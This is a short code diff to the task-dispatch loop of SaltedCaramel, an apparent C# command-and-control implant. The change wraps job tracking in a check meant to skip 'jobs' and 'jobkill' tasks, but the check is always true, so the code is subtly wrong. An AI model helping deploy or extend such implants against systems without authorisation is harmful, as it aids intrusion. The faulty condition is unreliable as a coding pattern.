@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
 using System.Net;
@@ -46,16 +45,21 @@ namespace SaltedCaramel
                         Thread t = new Thread(() => task.DispatchTask(implant));
                         t.Start();
 
-                        Job j = new Job
+                        if (task.command != "jobs" || task.command != "jobkill") // We don't want to add our job tracking jobs.
                         {
-                            shortId = task.shortId,
-                            task = task.command,
-                            thread = t
-                        };
+                            Job j = new Job
+                            {
+                                shortId = task.shortId,
+                                task = task.command,
+                                thread = t
+                            };
 
-                        if (task.@params != "") j.task += " " + task.@params;
+                            if (task.@params != "") 
+                                j.task += " " + task.@params;
 
-                        implant.jobs.Add(j);
+                            implant.jobs.Add(j);
+                        }
+
 
                     }
                     Thread.Sleep(implant.sleep);
